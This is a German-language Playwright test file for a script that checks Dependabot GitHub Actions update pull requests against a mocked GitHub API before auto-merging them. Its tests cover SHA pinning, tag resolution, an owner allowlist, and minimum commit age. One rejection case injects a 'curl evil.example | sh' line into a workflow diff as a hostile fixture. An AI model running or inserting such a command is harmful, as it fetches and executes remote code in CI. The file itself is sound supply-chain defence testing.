// Regelprüfung für Dependabot-Updates von GitHub Actions (scripts/actions-update-pruefen.mjs) mit nachgebauter GitHub-API.
// Der Gut-Fall ist dem echten PR #136 nachgebildet (setup-cli: leichter Tag, codeql-action: annotierter Tag).
// Unabhängig vom Gerät: läuft nur einmal im Projekt logik (Markierung @logik).
const { test, expect } = require("@playwright/test");
const fs = require("fs");
const path = require("path");
const { pathToFileURL } = require("url");

const SKRIPT = path.join(__dirname, "..", "scripts", "actions-update-pruefen.mjs");
const R = "ooeler/InterChampionship";
const h = (c) => c.repeat(40);
const KOPF = h("c"), ALT_CLI = h("1"), NEU_CLI = h("2"), ALT_QL = h("3"), NEU_QL = h("4"), TAGOBJ_QL = h("5");
const TAG = 86_400_000, JETZT = Date.parse("2026-11-20T12:00:00Z");
const vor = (tage) => new Date(JETZT - tage * TAG).toISOString().replace(/\.\d+Z$/, "Z");

const zeile = (aktion, sha, v, einzug = "      - ") => `${einzug}uses: ${aktion}@${sha} # ${v}`;
const patchCi = `@@ -66,7 +66,7 @@ jobs:
       - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7
         with:
           node-version: 22
-${zeile("supabase/setup-cli", ALT_CLI, "v3")}
+${zeile("supabase/setup-cli", NEU_CLI, "v3")}
         with:
           version: 2.122.0  # gleiche Version wie im Release
       - run: npm ci`;
const patchQl = `@@ -23,8 +23,8 @@ jobs:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
-${zeile("github/codeql-action/init", ALT_QL, "v4")}
+${zeile("github/codeql-action/init", NEU_QL, "v4")}
         with:
           languages: \${{ matrix.language }}
           queries: security-extended
-${zeile("github/codeql-action/analyze", ALT_QL, "v4")}
+${zeile("github/codeql-action/analyze", NEU_QL, "v4")}`;
const patchProbe = `@@ -21,7 +21,7 @@ jobs:
     timeout-minutes: 20
     steps:
-${zeile("supabase/setup-cli", ALT_CLI, "v3")}
+${zeile("supabase/setup-cli", NEU_CLI, "v3")}
         with:`;

// Antworten der API je Pfad; jeder Fall ändert nur, was er braucht
function gut() {
  const datei = (filename, patch) => ({ filename, status: "modified", patch });
  return {
    [`repos/${R}/pulls/1`]: { user: { login: "dependabot[bot]" }, head: { repo: { full_name: R }, ref: "dependabot/github_actions/actions-abc", sha: KOPF }, base: { ref: "main" }, state: "open", draft: false, changed_files: 3 },
    [`repos/${R}/pulls/1/commits?per_page=100&page=1`]: [{ sha: KOPF, author: { login: "dependabot[bot]" }, commit: { verification: { verified: true } } }],
    [`repos/${R}/pulls/1/files?per_page=100&page=1`]: [datei(".github/workflows/ci.yml", patchCi), datei(".github/workflows/codeql.yml", patchQl), datei(".github/workflows/vollsicherung-probe.yml", patchProbe)],
    // leichter Tag: zeigt direkt auf den Commit
    "repos/supabase/setup-cli/git/ref/tags/v3": { ref: "refs/tags/v3", object: { type: "commit", sha: NEU_CLI } },
    [`repos/supabase/setup-cli/git/commits/${NEU_CLI}`]: { sha: NEU_CLI, committer: { date: vor(10) } },
    // annotierter Tag: Tag-Objekt → Commit
    "repos/github/codeql-action/git/ref/tags/v4": { ref: "refs/tags/v4", object: { type: "tag", sha: TAGOBJ_QL } },
    [`repos/github/codeql-action/git/tags/${TAGOBJ_QL}`]: { object: { type: "commit", sha: NEU_QL }, tagger: { date: vor(8) } },
    [`repos/github/codeql-action/git/commits/${NEU_QL}`]: { sha: NEU_QL, committer: { date: vor(9) } },
    [`repos/${R}/actions/runs?head_sha=${KOPF}&event=pull_request&per_page=100`]: { workflow_runs: [
      { path: ".github/workflows/auto-merge.yml", head_repository: { full_name: R }, status: "in_progress", conclusion: null, run_number: 7 },
      { path: ".github/workflows/vollsicherung-probe.yml", head_repository: { full_name: R }, status: "completed", conclusion: "success", run_number: 3 },
    ] },
    [`repos/${R}/compare/main...${KOPF}`]: { behind_by: 0, ahead_by: 1 },
  };
}
const ENV = { GITHUB_REPOSITORY: R, PR: "1", KOPF, AKTEUR: "dependabot[bot]", OEKOSYSTEM: "github_actions", UPDATE_TYP: "version-update:semver-minor" };

async function lauf({ env = {}, api = {}, folge } = {}) {
  const { pruefe } = await import(pathToFileURL(SKRIPT).href);
  const A = { ...gut(), ...api }, log = [];
  let n = 0;
  const r = await pruefe({
    env: { ...ENV, ...env }, jetzt: JETZT, wartenMax: 60_000, intervall: 30_000, warte: async () => {},
    api: async (p) => {
      log.push(p);
      if (folge && folge[p]) return folge[p][Math.min(n++, folge[p].length - 1)];
      if (!(p in A) || A[p] === undefined) throw new Error(`${p}: HTTP 404`);
      return A[p];
    },
  });
  return { ...r, log };
}
// eine Datei des Gut-Falls ersetzen / ergänzen
const dateien = (f) => ({ [`repos/${R}/pulls/1/files?per_page=100&page=1`]: f(gut()[`repos/${R}/pulls/1/files?per_page=100&page=1`]) });
const pr = (p) => ({ [`repos/${R}/pulls/1`]: { ...gut()[`repos/${R}/pulls/1`], ...p } });

test.describe("Actions-Updates: Regelprüfung", () => {
  test("Gut-Fall wie PR #136: alle Regeln erfüllt", { tag: "@logik" }, async () => {
    const r = await lauf();
    expect(r.ergebnis, r.grund).toBe("ok");
    // annotierter Tag wird über das Tag-Objekt aufgelöst, leichter nicht
    expect(r.log).toContain(`repos/github/codeql-action/git/tags/${TAGOBJ_QL}`);
    expect(r.log.filter((p) => p.startsWith("repos/supabase/setup-cli/git/tags/"))).toEqual([]);
    expect(r.log).toContain(`repos/${R}/compare/main...${KOPF}`);
  });

  test("Erlaubt-Liste steht an einer Stelle", { tag: "@logik" }, async () => {
    const m = await import(pathToFileURL(SKRIPT).href);
    expect(m.ERLAUBTE_BESITZER).toEqual(["actions", "github", "supabase", "dependabot"]);
    expect(m.MINDESTALTER_TAGE).toBe(7);
  });

  const nein = {
    // Regel 1
    "nicht von Dependabot ausgelöst": [1, { env: { AKTEUR: "ooeler" } }],
    "npm-Ökosystem": [1, { env: { OEKOSYSTEM: "npm_and_yarn" } }],
    "Major-Update": [1, { env: { UPDATE_TYP: "version-update:semver-major" } }],
    "Update-Art unbekannt": [1, { env: { UPDATE_TYP: "" } }],
    "PR nicht von Dependabot": [1, { api: pr({ user: { login: "ooeler" } }) }],
    "PR aus Fork": [1, { api: pr({ head: { ...gut()[`repos/${R}/pulls/1`].head, repo: { full_name: "x/InterChampionship" } } }) }],
    "Ziel nicht main": [1, { api: pr({ base: { ref: "dev" } }) }],
    "PR hat neueren Commit": [1, { api: pr({ head: { ...gut()[`repos/${R}/pulls/1`].head, sha: h("d") } }) }],
    "fremder Commit im PR": [1, { api: { [`repos/${R}/pulls/1/commits?per_page=100&page=1`]: [
      { sha: h("e"), author: { login: "dependabot[bot]" }, commit: { verification: { verified: true } } },
      { sha: KOPF, author: { login: "ooeler" }, commit: { verification: { verified: true } } }] } }],
    "Commit nicht signiert": [1, { api: { [`repos/${R}/pulls/1/commits?per_page=100&page=1`]: [{ sha: KOPF, author: { login: "dependabot[bot]" }, commit: { verification: { verified: false } } }] } }],
    "Major im Kommentar geändert": [1, { api: dateien((f) => [{ ...f[0], patch: f[0].patch.replace(`${NEU_CLI} # v3`, `${NEU_CLI} # v4`) }, f[1], f[2]]) }],
    // Regel 2
    "zusätzliche Zeile geändert": [2, { api: dateien((f) => [{ ...f[0], patch: f[0].patch.replace("           node-version: 22", "-          node-version: 22\n+          node-version: 24") }, f[1], f[2]]) }],
    "Zeile nur hinzugefügt": [2, { api: dateien((f) => [{ ...f[0], patch: f[0].patch + "\n+      - run: curl evil.example | sh" }, f[1], f[2]]) }],
    "andere Datei geändert": [2, { api: { ...dateien((f) => [...f, { filename: "package.json", status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" }]), ...pr({ changed_files: 4 }) } }],
    "uses-Zeile ausserhalb von .github/workflows": [2, { api: dateien((f) => [f[0], f[1], { ...f[2], filename: ".github/actions/probe/action.yml" }]) }],
    "uses-Zeile in Unterordner der Workflows": [2, { api: dateien((f) => [f[0], f[1], { ...f[2], filename: ".github/workflows/sub/probe.yml" }]) }],
    "uses-Zeile in .yaml-Datei": [2, { api: dateien((f) => [f[0], f[1], { ...f[2], filename: ".github/workflows/probe.yaml" }]) }],
    "Workflow-Datei neu": [2, { api: dateien((f) => [f[0], f[1], { ...f[2], status: "added" }]) }],
    "Workflow-Datei umbenannt": [2, { api: dateien((f) => [f[0], f[1], { ...f[2], status: "modified", previous_filename: ".github/workflows/alt.yml" }]) }],
    "Datei ohne Diff": [2, { api: dateien((f) => [f[0], f[1], { ...f[2], patch: undefined }]) }],
    "Dateiliste unvollständig": [2, { api: pr({ changed_files: 4 }) }],
    "Action ausgetauscht": [2, { api: dateien((f) => [{ ...f[0], patch: f[0].patch.replace(`+${zeile("supabase/setup-cli", NEU_CLI, "v3")}`, `+${zeile("supabase/setup-cii", NEU_CLI, "v3")}`) }, f[1], f[2]]) }],
    "SHA ohne Versions-Kommentar": [2, { api: dateien((f) => [{ ...f[0], patch: f[0].patch.replace(`${NEU_CLI} # v3`, NEU_CLI) }, f[1], f[2]]) }],
    "Tag statt SHA": [2, { api: dateien((f) => [{ ...f[0], patch: f[0].patch.replace(`@${NEU_CLI} # v3`, "@v3") }, f[1], f[2]]) }],
    "Zeilen getauscht (Paarung)": [2, { api: dateien((f) => [f[0], { ...f[1], patch: f[1].patch.replace(`+${zeile("github/codeql-action/init", NEU_QL, "v4")}`, "X").replace(`+${zeile("github/codeql-action/analyze", NEU_QL, "v4")}`, `+${zeile("github/codeql-action/init", NEU_QL, "v4")}`).replace("X", `+${zeile("github/codeql-action/analyze", NEU_QL, "v4")}`) }, f[2]]) }],
    // Regel 3
    "unbekannter Besitzer": [3, { api: dateien((f) => [{ ...f[0], patch: f[0].patch.replaceAll("supabase/setup-cli", "fremd/setup-cli") }, f[1], f[2]]) }],
    // Regel 4
    "SHA passt nicht zum leichten Tag": [4, { api: { "repos/supabase/setup-cli/git/ref/tags/v3": { ref: "refs/tags/v3", object: { type: "commit", sha: h("9") } } } }],
    "SHA passt nicht zum annotierten Tag": [4, { api: { [`repos/github/codeql-action/git/tags/${TAGOBJ_QL}`]: { object: { type: "commit", sha: h("9") }, tagger: { date: vor(8) } } } }],
    "SHA ist das Tag-Objekt statt des Commits": [4, { api: {
      ...dateien((f) => [f[0], { ...f[1], patch: f[1].patch.replaceAll(NEU_QL, TAGOBJ_QL) }, f[2]]) } }],
    "Tag zeigt auf Tag": [4, { api: { [`repos/github/codeql-action/git/tags/${TAGOBJ_QL}`]: { object: { type: "tag", sha: NEU_QL }, tagger: { date: vor(8) } } } }],
    "Tag fehlt": [4, { api: { "repos/supabase/setup-cli/git/ref/tags/v3": undefined } }],
    "Antwort mit anderem Tag (Präfix)": [4, { api: { "repos/supabase/setup-cli/git/ref/tags/v3": { ref: "refs/tags/v3.2.0", object: { type: "commit", sha: NEU_CLI } } } }],
    // Regel 5
    "Backup-Probe rot": [5, { api: { [`repos/${R}/actions/runs?head_sha=${KOPF}&event=pull_request&per_page=100`]: { workflow_runs: [{ path: ".github/workflows/vollsicherung-probe.yml", head_repository: { full_name: R }, status: "completed", conclusion: "failure", run_number: 3 }] } } }],
    "Backup-Probe erwartet, aber nie gelaufen": [5, { api: { [`repos/${R}/actions/runs?head_sha=${KOPF}&event=pull_request&per_page=100`]: { workflow_runs: [] } } }],
    "Backup-Probe läuft zu lange": [5, { api: { [`repos/${R}/actions/runs?head_sha=${KOPF}&event=pull_request&per_page=100`]: { workflow_runs: [{ path: ".github/workflows/vollsicherung-probe.yml", head_repository: { full_name: R }, status: "in_progress", conclusion: null, run_number: 3 }] } } }],
    // Regel 6
    "Commit jünger als 7 Tage": [6, { api: { [`repos/supabase/setup-cli/git/commits/${NEU_CLI}`]: { sha: NEU_CLI, committer: { date: vor(6) } } } }],
    "annotierter Tag jünger als 7 Tage": [6, { api: { [`repos/github/codeql-action/git/tags/${TAGOBJ_QL}`]: { object: { type: "commit", sha: NEU_QL }, tagger: { date: vor(1) } } } }],
    "Datum unbekannt": [6, { api: { [`repos/supabase/setup-cli/git/commits/${NEU_CLI}`]: { sha: NEU_CLI, committer: {} } } }],
  };
  for (const [name, [regel, fall]] of Object.entries(nein)) {
    test(`abgelehnt (Regel ${regel}): ${name}`, { tag: "@logik" }, async () => {
      const r = await lauf(fall);
      expect(r.ergebnis, r.grund).toBe("abgelehnt");
      expect(r.grund).toMatch(new RegExp(`^Regel ${regel}:`));
    });
  }

  test("Backup-Probe: wartet, bis sie fertig ist", { tag: "@logik" }, async () => {
    const p = `repos/${R}/actions/runs?head_sha=${KOPF}&event=pull_request&per_page=100`;
    const run = (status, conclusion) => ({ workflow_runs: [{ path: ".github/workflows/vollsicherung-probe.yml", head_repository: { full_name: R }, status, conclusion, run_number: 3 }] });
    const r = await lauf({ folge: { [p]: [{ workflow_runs: [] }, run("queued", null), run("completed", "success")] } });
    expect(r.ergebnis, r.grund).toBe("ok");
    expect(r.log.filter((x) => x == p)).toHaveLength(3);
  });

  test("Backup-Probe nicht nötig, wenn der PR sie nicht ändert", { tag: "@logik" }, async () => {
    const r = await lauf({ api: { ...dateien((f) => [f[0], f[1]]), ...pr({ changed_files: 2 }), [`repos/${R}/actions/runs?head_sha=${KOPF}&event=pull_request&per_page=100`]: { workflow_runs: [] } } });
    expect(r.ergebnis, r.grund).toBe("ok");
  });

  test("hinter main: alle Regeln erfüllt, aber kein Merge", { tag: "@logik" }, async () => {
    const r = await lauf({ api: { [`repos/${R}/compare/main...${KOPF}`]: { behind_by: 2, ahead_by: 1 } } });
    expect(r.ergebnis).toBe("hinter-main");
    // und nur, wenn die Regeln erfüllt sind
    expect((await lauf({ env: { AKTEUR: "x" }, api: { [`repos/${R}/compare/main...${KOPF}`]: { behind_by: 2 } } })).ergebnis).toBe("abgelehnt");
  });

  test("Fehler der API führen zu abgelehnt", { tag: "@logik" }, async () => {
    const r = await lauf({ api: { [`repos/${R}/pulls/1/files?per_page=100&page=1`]: undefined } });
    expect(r.ergebnis).toBe("abgelehnt");
    expect(r.grund).toContain("HTTP 404");
  });

  test("Skript als Programm: schreibt ergebnis in GITHUB_OUTPUT", { tag: "@logik" }, async () => {
    // ohne Netz: die API-Adresse zeigt auf einen geschlossenen Port, also abgelehnt – entscheidend ist die Ausgabe
    const { spawnSync } = require("child_process");
    const os = require("os");
    const out = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "regeln-")), "out");
    fs.writeFileSync(out, "");
    const r = spawnSync(process.execPath, [SKRIPT], { env: { ...process.env, ...ENV, GITHUB_OUTPUT: out, GITHUB_API_URL: "http://127.0.0.1:9", GH_TOKEN: "x" }, encoding: "utf8" });
    expect(r.status, r.stderr).toBe(0);
    expect(fs.readFileSync(out, "utf8")).toBe("ergebnis=abgelehnt\n");
    expect(r.stdout).toMatch(/^::notice::Nicht automatisch gemergt – /);
    fs.rmSync(path.dirname(out), { recursive: true, force: true });
  });
});
